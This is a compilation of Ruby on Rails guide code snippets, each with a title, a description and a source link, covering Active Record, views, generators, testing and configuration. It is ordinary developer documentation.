https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_71\n\nLANGUAGE: erb\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <!-- ... -->\n  <body>\n    <nav>\n      <%= link_to \"Home\", root_path %>\n      <%= button_to \"Log out\", session_path, method: :delete if authenticated? %>\n    </nav>\n\n    <main>\n      <%= yield %>\n    </main>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Creating a Controller with Enhanced Logging\nDESCRIPTION: Shows a complete Rails controller example with additional logging statements to track the article creation process. This helps in understanding the flow and debugging issues.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass ArticlesController < ApplicationController\n  # ...\n\n  def create\n    @article = Article.new(article_params)\n    logger.debug \"New article: #{@article.attributes.inspect}\"\n    logger.debug \"Article should be valid: #{@article.valid?}\"\n\n    if @article.save\n      logger.debug \"The article was saved and now the user is going to be redirected...\"\n      redirect_to @article, notice: 'Article was successfully created.'\n    else\n      render :new, status: :unprocessable_entity\n    end\n  end\n\n  # ...\n\n  private\n    def article_params\n      params.expect(article: [:title, :body, :published])\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Listing Included Modules for ActionController::API - IRB Example\nDESCRIPTION: Lists modules that are included in ActionController::API but not in ActionController::Metal, using Ruby's IRB console. Helps developers understand which features and helpers are available by default in API controllers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nirb> ActionController::API.ancestors - ActionController::Metal.ancestors\n=> [ActionController::API,\n    ActiveRecord::Railties::ControllerRuntime,\n    ActionDispatch::Routing::RouteSet::MountedHelpers,\n    ActionController::ParamsWrapper,\n    ... ,\n    AbstractController::Rendering,\n    ActionView::ViewPaths]\n```\n\n----------------------------------------\n\nTITLE: Chaining Group Clauses Without Regrouping (Ruby)\nDESCRIPTION: This snippet shows how `group` clauses are combined together when `regroup` is not used to override the condition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_127\n\nLANGUAGE: ruby\nCODE:\n```\nBook.group(:author).group(:id)\n```\n\n----------------------------------------\n\nTITLE: Specifying a Standard Gem Dependency (Ruby)\nDESCRIPTION: Shows the standard way to declare a gem dependency (using Devise as an example) in an application's `Gemfile`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"devise\"\n```\n\n----------------------------------------\n\nTITLE: Engine Base Module Definition\nDESCRIPTION: Basic module definition for the engine with engine.rb requirement\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"blorgh/engine\"\n\nmodule Blorgh\nend\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of last\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.last` method in Rails. It selects all columns from the `customers` table, orders the results by the `id` column in descending order, and limits the result to 1 record, effectively fetching the last row ordered by primary key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_27\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.id DESC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Checking Available Rails Generators\nDESCRIPTION: Commands to create a new Rails application and list available generators\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp\n$ cd myapp\n$ bin/rails generate\n```\n\n----------------------------------------\n\nTITLE: Generating Comment Model in Rails Engine (Bash)\nDESCRIPTION: Uses the Rails generator to create a 'Comment' model within the 'blorgh' engine namespace. It specifies an 'article' association (references) and a 'text' column (text type). This command scaffolds the model file, migration file, test file, and fixture file under the engine's structure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_15\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Comment article:references text:text\n```\n\n----------------------------------------\n\nTITLE: Implementing Engine Functional Tests in Ruby\nDESCRIPTION: Example of writing functional tests for a Rails engine controller, showing how to properly set up routing for engine tests using url_helpers and route configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Blorgh\n  class FooControllerTest < ActionDispatch::IntegrationTest\n    include Engine.routes.url_helpers\n\n    def test_index\n      get foos_url\n      # ...\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Customer Partial (_customer.html.erb)\nDESCRIPTION: This snippet displays the name of a customer. It expects a local variable `customer` to be passed to the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_88\n\nLANGUAGE: html+erb\nCODE:\n```\n<p>Customer: <%= customer.name %></p>\n```\n\n----------------------------------------\n\nTITLE: Rendering XML in Rails\nDESCRIPTION: This snippet demonstrates how to render an object as XML in Rails. The `render` method automatically calls `to_xml` on the object. No specific dependencies are required beyond the basic Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nrender xml: @product\n```\n\n----------------------------------------\n\nTITLE: Rails Params Hash Example (Single Level)\nDESCRIPTION: Demonstrates how form input translates into the params hash in a Rails controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"person\" => { \"name\" => \"Henry\" } }\n```\n\n----------------------------------------\n\nTITLE: Generating Migration for Author ID Column\nDESCRIPTION: Rails command to generate a migration that adds an author_id column to the blorgh_articles table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_41\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration add_author_id_to_blorgh_articles author_id:integer\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Coder for ActiveRecord::Store\nDESCRIPTION: Example demonstrating how to set a custom coder for ActiveRecord::Store, allowing different serialization formats for stored attributes. This example uses JSON as the coder with specific accessors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_0_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nstore :settings, accessors: [ :color, :homepage ], coder: JSON\n```\n\n----------------------------------------\n\nTITLE: Implementing Method Delegation with Polymorphism in Rails\nDESCRIPTION: Enhances the delegated type pattern by defining method delegation from Entry to its subclasses. This example demonstrates how to delegate the title method which is implemented differently in each subclass, showcasing polymorphic behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\nclass Entry < ApplicationRecord\n  delegated_type :entryable, types: %w[ Message Comment ]\n  delegate :title, to: :entryable\nend\n\nclass Message < ApplicationRecord\n  include Entryable\n\n  def title\n    subject\n  end\nend\n\nclass Comment < ApplicationRecord\n  include Entryable\n\n  def title\n    content.truncate(20)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Broadcasts Inside Components\nDESCRIPTION: This code illustrates how to test if the correct message has been broadcasted within other components, such as models, using custom assertions provided by Action Cable. It asserts that a specific message is broadcasted on a certain stream when a product is charged.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ProductTest < ActionCable::TestCase\n  test \"broadcast status after charge\" do\n    assert_broadcast_on(\"products:#{product.id}\", type: \"charged\") do\n      product.charge(account)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Model Definition for Composite Primary Key Relationships\nDESCRIPTION: This snippet defines the `BookOrder` model with a composite primary key (`[:shop_id, :id]`) and composite foreign keys referencing both `Order` and `Book` models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass BookOrder < ApplicationRecord\n  self.primary_key = [:shop_id, :id]\n  belongs_to :order, foreign_key: [:shop_id, :order_id]\n  belongs_to :book, foreign_key: [:author_id, :book_id]\nend\n```\n\n----------------------------------------\n\nTITLE: Edit Product Link - ERB\nDESCRIPTION: This ERB snippet adds an \"Edit\" link to the product show page, linking to the `edit_product_path` with the current product object passed as a parameter.  It depends on the `@product` instance variable being available in the view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_59\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= @product.name %></h1>\n\n<%= link_to \"Back\", products_path %>\n<%= link_to \"Edit\", edit_product_path(@product) %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Exception Response Format for APIs - Ruby\nDESCRIPTION: Specifies API-specific exception response formatting in development by setting config.debug_exception_response_format to :api. This helps ensure debugging output matches API response standards in API-only Rails projects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.debug_exception_response_format = :api\n```\n\n----------------------------------------\n\nTITLE: Generating User URL with Named Route Including Host (ERB)\nDESCRIPTION: This ERB snippet demonstrates generating a user-specific absolute URL by calling the user_url route helper with both the user object and an explicit host option. This is needed for emails if default_url_options is not globally set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_20\n\nLANGUAGE: erb\nCODE:\n```\n<%= user_url(@user, host: 'example.com') %>\n```\n\n----------------------------------------\n\nTITLE: Adding Unsubscribe Link to Text Email Template - ERB\nDESCRIPTION: This code snippet adds an unsubscribe link to the text email template. It includes the product name, product URL, and the unsubscribe URL, all rendered as plain text.  The unsubscribe URL includes a token generated using `params[:subscriber].generate_token_for(:unsubscribe)` to identify the subscriber.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_118\n\nLANGUAGE: erb\nCODE:\n```\nGood news!\n\n<%= @product.name %> is back in stock.\n<%= product_url(@product) %>\n\nUnsubscribe: <%= unsubscribe_url(token: params[:subscriber].generate_token_for(:unsubscribe)) %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails Generator Fallbacks in Ruby\nDESCRIPTION: Shows how to configure generator fallbacks in `config/application.rb`. It sets `my_test_unit` as the primary test framework but configures `test_unit` as a fallback using `g.fallbacks[:my_test_unit] = :test_unit`, so generators not defined in `my_test_unit` will use the corresponding `test_unit` generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.generators do |g|\n  g.test_framework :my_test_unit, fixture: false\n  g.fallbacks[:my_test_unit] = :test_unit\nend\n```\n\n----------------------------------------\n\nTITLE: Comparing MiniMagick and Vips Transformation Options in Active Storage\nDESCRIPTION: Illustrates the difference in parameter syntax between MiniMagick and Vips processors when applying image transformations. This is important when migrating an application between processors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_58\n\nLANGUAGE: erb\nCODE:\n```\n<!-- MiniMagick -->\n<%= image_tag user.avatar.variant(resize_to_limit: [100, 100], format: :jpeg, sampling_factor: \"4:2:0\", strip: true, interlace: \"JPEG\", colorspace: \"sRGB\", quality: 80) %>\n\n<!-- Vips -->\n<%= image_tag user.avatar.variant(resize_to_limit: [100, 100], format: :jpeg, saver: { subsample_mode: \"on\", strip: true, interlace: true, quality: 80 }) %>\n```\n\n----------------------------------------\n\nTITLE: Inefficient Logging Example with String Interpolation in Ruby\nDESCRIPTION: Illustrates a potentially inefficient logging practice in Ruby. Even if the log level (e.g., `:debug`) is disabled, Ruby evaluates the string interpolation (`#{@person.attributes.inspect}`), creating string objects and potentially performing expensive operations unnecessarily. This can impact performance, especially with frequent logging calls.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nlogger.debug \"Person attributes hash: #{@person.attributes.inspect}\"\n```\n\n----------------------------------------\n\nTITLE: Adding Unique Index and Foreign Key Constraint in a Migration - Ruby\nDESCRIPTION: Shows how to enforce one-to-one relationships at the database level by adding a unique index and foreign key constraint to the supplier_id column in accounts. Improves data integrity and query performance. Requires an existing accounts table; typically used in a migration file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_table :accounts do |t|\\n  t.belongs_to :supplier, index: { unique: true }, foreign_key: true\\n  # ...\\nend\n```\n\n----------------------------------------\n\nTITLE: Updating an Active Record Object using the Update Method in Ruby\nDESCRIPTION: Retrieves a 'Book' record by its title and updates its 'title' attribute using the `update` method, passing a hash of attributes to be changed. This method is a shorthand that combines attribute assignment and saving, and it also triggers validations and callbacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nbook = Book.find_by(title: \"The Lord of the Rings\")\nbook.update(title: \"The Lord of the Rings: The Fellowship of the Ring\")\n```\n\n----------------------------------------\n\nTITLE: Defining a One-to-Many Association in Ruby\nDESCRIPTION: Defines a `has_many` association within the `Author` model using the `has_many :books` declaration. This establishes a one-to-many relationship, indicating that an instance of `Author` can be associated with multiple instances of `Book`. Active Record automatically provides methods like `author.books` based on this declaration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests via Command Line (Specific Method)\nDESCRIPTION: This code snippet shows how to execute a specific test method within a test file using the `bin/rails test` command along with the `-n` or `--name` flag and the name of the test method to be executed. This enables focused testing of individual components.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_18\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb -n test_the_truth\n```\n\n----------------------------------------\n\nTITLE: Deferring ActiveRecord Loading with ActiveSupport.on_load in Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to use `ActiveSupport.on_load` to defer loading of `ActiveRecord::Base` until it is actually needed, preventing premature loading of the entire Active Record framework. This is useful for improving boot time and avoiding load order conflicts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.on_load(:active_record) do\n  include MyActiveRecordHelper\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a Rich Text Area to the Product Form - ERB\nDESCRIPTION: This snippet adds a rich text area to the product form for editing the description using Action Text. It uses `form.rich_text_area` which generates the necessary HTML and JavaScript to enable the rich text editor.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_80\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: product do |form| %>\n  <%# ... %>\n\n  <div>\n    <%= form.label :description, style: \"display: block\" %>\n    <%= form.rich_text_area :description %>\n  </div>\n\n  <div>\n    <%= form.submit %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Implementing User Creation with Welcome Email\nDESCRIPTION: Controller implementation showing how to send a welcome email after user creation using deliver_later with Active Job integration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass UsersController < ApplicationController\n  # ...\n\n  def create\n    @user = User.new(user_params)\n\n    respond_to do |format|\n      if @user.save\n        # Tell the UserMailer to send a welcome email after save\n        UserMailer.with(user: @user).welcome_email.deliver_later\n\n        format.html { redirect_to user_url(@user), notice: \"User was successfully created.\" }\n        format.json { render :show, status: :created, location: @user }\n      else\n        format.html { render :new, status: :unprocessable_entity }\n        format.json { render json: @user.errors, status: :unprocessable_entity }\n      end\n    end\n  end\n\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Output Showing Custom Helper Generator Invocation using Bash\nDESCRIPTION: Displays the output of running `bin/rails generate scaffold Article body:text` after configuring the custom helper. It highlights that the `invoke my_helper` line appears instead of `invoke helper`, confirming the override was successful.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold Article body:text\n      ...\n      invoke  scaffold_controller\n      ...\n      invoke    my_helper\n      create      app/helpers/articles_helper.rb\n      ...\n```\n\n----------------------------------------\n\nTITLE: Creating Associated Records with Composite Foreign Key\nDESCRIPTION: This snippet shows how to create associated records when using a composite foreign key in the association. It creates an `Author` record with a composite primary key and a `Book` record associated with that author, explicitly setting the `author_first_name` and `author_last_name` foreign key attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nauthor = Author.create!(first_name: \"Jane\", last_name: \"Doe\")\nbook = author.books.create!(title: \"A Cool Book\", author_first_name: \"Jane\", author_last_name: \"Doe\")\n```\n\n----------------------------------------\n\nTITLE: Implementing Confirmation Fields in Rails View (ERB)\nDESCRIPTION: Shows how to create the necessary text input fields in an ERB view template for an attribute (`email`) and its confirmation (`email_confirmation`) using Rails `text_field` form helpers. This setup is typically used with the `confirmation` validator in the model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_14\n\nLANGUAGE: erb\nCODE:\n```\n<%= text_field :person, :email %>\n<%= text_field :person, :email_confirmation %>\n```\n\n----------------------------------------\n\nTITLE: Querying Changed Attributes (IRB)\nDESCRIPTION: This series of IRB snippets showcases how to query an object for its changed attributes using `changed?`, `changed`, `changed_attributes`, `changes`, and `previous_changes` methods. These are helpful for tracking and understanding changes to model attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new\n\n# A newly instantiated `Person` object is unchanged:\nirb> person.changed?\n=> false\n\nirb> person.first_name = \"Jane Doe\"\nirb> person.first_name\n=> \"Jane Doe\"\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.changed?\n=> true\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.changed\n=> [\"first_name\"]\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.changed_attributes\n=> {\"first_name\" => nil}\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.changes\n=> {\"first_name\" => [nil, \"Jane Doe\"]}\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.previous_changes\n=> {}\n\nirb> person.save\nirb> person.previous_changes\n=> {\"first_name\" => [nil, \"Jane Doe\"]}\n```\n\n----------------------------------------\n\nTITLE: Checking for Multiple Elements with many? in Ruby\nDESCRIPTION: This demonstrates the `many?` method, a shorthand for `collection.size > 1`.  It checks if a collection contains more than one element. Optionally, a block can be provided to filter elements considered in the count.  Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_112\n\nLANGUAGE: ruby\nCODE:\n```\n<% if pages.many? %>\n  <%= pagination_links %>\n<% end %>\n```\n\nLANGUAGE: ruby\nCODE:\n```\n@see_more = videos.many? { |video| video.category == params[:category] }\n```\n\n----------------------------------------\n\nTITLE: Displaying Flash Messages in View - ERB\nDESCRIPTION: This code snippet demonstrates how to display flash messages in an ERB template. It iterates through the `flash` hash and generates a `div` element for each message, using the flash key as the CSS class.  This ensures all flash messages are displayed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_29\n\nLANGUAGE: erb\nCODE:\n```\n<% if flash[:just_signed_up] %>\n  <p class=\"welcome\">Welcome to our site!</p>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: SQL Generated for has_many through with disable_joins Option\nDESCRIPTION: Example SQL queries generated when accessing a has_many through association with disable_joins option. Instead of a single join query, it performs two separate queries to retrieve the associated records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_32\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"humans\".\"id\" FROM \"humans\" WHERE \"humans\".\"dog_id\" = ?  [[\"dog_id\", 1]]\nSELECT \"treats\".* FROM \"treats\" WHERE \"treats\".\"human_id\" IN (?, ?, ?)  [[\"human_id\", 1], [\"human_id\", 2], [\"human_id\", 3]]\n```\n\n----------------------------------------\n\nTITLE: Updating button_to Method Call for Rails 7.0 - Ruby and Diff\nDESCRIPTION: Shows how to modify button_to calls to specify the HTTP method explicitly when working with persisted Active Record objects in Rails 7.0, as the default behavior now uses PATCH instead of POST.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n-button_to(\"Do a POST\", [:my_custom_post_action_on_workshop, Workshop.find(1)])\n+button_to(\"Do a POST\", [:my_custom_post_action_on_workshop, Workshop.find(1)], method: :post)\n```\n\n----------------------------------------\n\nTITLE: Permitting Parameters in Rails\nDESCRIPTION: This snippet demonstrates how to permit specific parameters in Rails controllers. It uses the `params.expect` method to whitelist allowed parameters and nested attributes, specifying permitted scalar values, arrays of scalars, and nested hashes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nname, emails, friends = params.expect(\n  :name,                 # permitted scalar\n  emails: [],            # array of permitted scalars\n  friends: [[            # array of permitted Parameter hashes\n    :name,               # permitted scalar\n    family: [:name],     # family: { name: \"permitted scalar\" }\n    hobbies: []          # array of permitted scalars\n  ]]\n)\n```\n\n----------------------------------------\n\nTITLE: Configuring Queue Name Delimiter for Active Job in Rails\nDESCRIPTION: This code snippet shows how to configure the queue name delimiter for Active Job. It sets both `queue_name_prefix` to \"video_server\" and `queue_name_delimiter` to \".\".  This results in the queue name being prefixed with \"video_server\", separated by a dot, e.g., `video_server.low_priority`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\n# prefix must be set for delimiter to be used\nconfig.active_job.queue_name_prefix = \"video_server\"\nconfig.active_job.queue_name_delimiter = \".\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Analyzers in Ruby\nDESCRIPTION: This snippet shows how to configure the analyzers used by Active Storage to extract metadata from blobs. It sets the `config.active_storage.analyzers` to an array of analyzer classes. These analyzers extract data like width and height from images, or duration from audio and video.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.analyzers = [ActiveStorage::Analyzer::ImageAnalyzer::Vips, ActiveStorage::Analyzer::ImageAnalyzer::ImageMagick, ActiveStorage::Analyzer::VideoAnalyzer, ActiveStorage::Analyzer::AudioAnalyzer]\n```\n\n----------------------------------------\n\nTITLE: Example Payload for halted_callback.action_controller Hook in Ruby\nDESCRIPTION: Presents an example Ruby Hash payload for the `halted_callback.action_controller` notification. This event occurs when a controller callback (e.g., a `before_action`) halts the request processing chain. The payload identifies the specific filter (represented as a symbol or string) that caused the halt.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  filter: \":halting_filter\"\n}\n```\n\n----------------------------------------\n\nTITLE: Running Component Tests with a Specific Seed in Bash (Action Mailer)\nDESCRIPTION: Runs the entire test suite for the Action Mailer component using a specific randomization seed (15002) provided via the `SEED` environment variable. This helps in reproducing test failures that only occur with a specific random execution order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_19\n\nLANGUAGE: bash\nCODE:\n```\n$ cd actionmailer\n$ SEED=15002 bin/test\n```\n\n----------------------------------------\n\nTITLE: find_by with id_value\nDESCRIPTION: This code demonstrates using the `id_value` method to fetch the value of the `:id` column for a record, ensuring the correct record is found when using `find_by` on models with composite primary keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_40\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.last\n=> #<Customer id: 10, store_id: 5, first_name: \"Joe\">\nirb> Customer.find_by(id: customer.id_value) # Customer.find_by(id: 10)\n=> #<Customer id: 10, store_id: 5, first_name: \"Joe\">\n```\n\n----------------------------------------\n\nTITLE: Rails Before Initialize Hook - Alternate Ruby Syntax\nDESCRIPTION: This code snippet shows an alternative way to use the `before_initialize` hook by accessing the `Rails.application.config` object directly. This allows for defining initialization logic outside of the main application class definition. The code to be executed is placed within the `do...end` block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_109\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.before_initialize do\n  # initialization code goes here\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Rounded Strings in Ruby\nDESCRIPTION: Demonstrates rounding numbers to a specific precision using the `to_fs(:rounded)` method, including options for precision and significance. This is an ActiveSupport core extension to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\n111.2345.to_fs(:rounded)                     # => 111.235\n111.2345.to_fs(:rounded, precision: 2)       # => 111.23\n13.to_fs(:rounded, precision: 5)             # => 13.00000\n389.32314.to_fs(:rounded, precision: 0)      # => 389\n111.2345.to_fs(:rounded, significant: true)  # => 111\n```\n\n----------------------------------------\n\nTITLE: Iterate Through Weekly Subscribers with `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates how to iterate through a subset of `Customer` records (those who are weekly subscribers) using `find_each` on a relation. It retrieves customers in batches based on the `weekly_subscriber` attribute and sends them a newsletter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(weekly_subscriber: true).find_each do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: Creating New Product Form (ERB)\nDESCRIPTION: This ERB code generates a form for creating a new product in the `new.html.erb` view. It uses the `form_with` helper to create the form, including a label and text field for the product name and a submit button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_54\n\nLANGUAGE: erb\nCODE:\n```\n<h1>New product</h1>\n\n<%= form_with model: @product do |form| %>\n  <div>\n    <%= form.label :name %>\n    <%= form.text_field :name %>\n  </div>\n\n  <div>\n    <%= form.submit %>\n  </div>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Customizing Active Model Error full_message Format (YAML)\nDESCRIPTION: Demonstrates overriding the default format for `Error#full_message` in Active Model using i18n locale files. The example overrides the format for all `Person` attributes and for the specific `age` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_31\n\nLANGUAGE: yml\nCODE:\n```\nen:\n  activemodel: # or activerecord:\n    errors:\n      models:\n        person:\n          # Override the format for all Person attributes:\n          format: \"Invalid %{attribute} (%{message})\"\n          attributes:\n            age:\n              # Override the format for the age attribute:\n              format: \"%{message}\"\n              blank: \"Please fill in your %{attribute}\"\n```\n\n----------------------------------------\n\nTITLE: Using content_for Helper in Rails\nDESCRIPTION: The content_for helper stores a block of markup in an identifier for later use. This is commonly used for setting page-specific content like titles that are rendered in layouts. It can be called multiple times to append content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_42\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/users/special_page.html.erb %>\n<% content_for(:html_title) { \"Special Page Title\" } %>\n```\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/layouts/application.html.erb %>\n<html>\n  <head>\n    <title><%= content_for?(:html_title) ? yield(:html_title) : \"Default Title\" %></title>\n  </head>\n</html>\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/helpers/title_helper.rb\nmodule TitleHelper\n  def html_title\n    content_for(:html_title) || \"Default Title\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Chaining Scopes in Rails\nDESCRIPTION: Shows how to chain scopes in Rails. Chaining allows you to combine multiple scopes to create more complex queries.  All scope bodies should return an `ActiveRecord::Relation` or `nil` to allow for further methods to be called on it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_162\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  scope :out_of_print, -> { where(out_of_print: true) }\n  scope :out_of_print_and_expensive, -> { out_of_print.where(\"price > 500\") }\nend\n```\n\n----------------------------------------\n\nTITLE: Date calculations with next_week and prev_week in Ruby\nDESCRIPTION: It receives a symbol with a day name in English (default is the thread local Date.beginning_of_week, or config.beginning_of_week, or :monday) and it returns the date corresponding to that day. The method `prev_week` is analogous.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_143\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 9) # => Sun, 09 May 2010\nd.next_week              # => Mon, 10 May 2010\nd.next_week(:saturday)   # => Sat, 15 May 2010\n```\n\nLANGUAGE: ruby\nCODE:\n```\nd.prev_week              # => Mon, 26 Apr 2010\nd.prev_week(:saturday)   # => Sat, 01 May 2010\nd.prev_week(:friday)     # => Fri, 30 Apr 